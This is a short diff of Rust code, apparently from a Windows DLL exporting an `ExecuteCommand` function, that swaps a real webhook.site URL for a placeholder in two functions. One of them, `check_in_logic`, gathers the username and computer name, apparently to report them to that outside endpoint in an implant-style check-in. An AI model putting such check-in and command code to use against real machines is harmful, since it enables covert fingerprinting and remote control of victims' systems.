@@ -67,7 +67,7 @@ pub extern "system" fn ExecuteCommand(command_ptr: *const u16) {
 }
 
 fn visit_url_logic() {
-    let url = "https://webhook.site/6fd54d41-ae01-42b2-89af-a05736f0a914";
+    let url = "https://webhook.site/changemyexamplehere";
     match reqwest::blocking::get(url) {
         Ok(res) => println!("[+] VisitUrl Success: Status {}", res.status()),
         Err(e) => eprintln!("[!] VisitUrl FAILED: {:?}", e),
@@ -75,7 +75,7 @@ fn visit_url_logic() {
 }
 
 fn check_in_logic() {
-    let url = "https://webhook.site/6fd54d41-ae01-42b2-89af-a05736f0a914";
+    let url = "https://webhook.site/changemyexamplehere";
     let user = std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".into());
     let host = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".into());
     
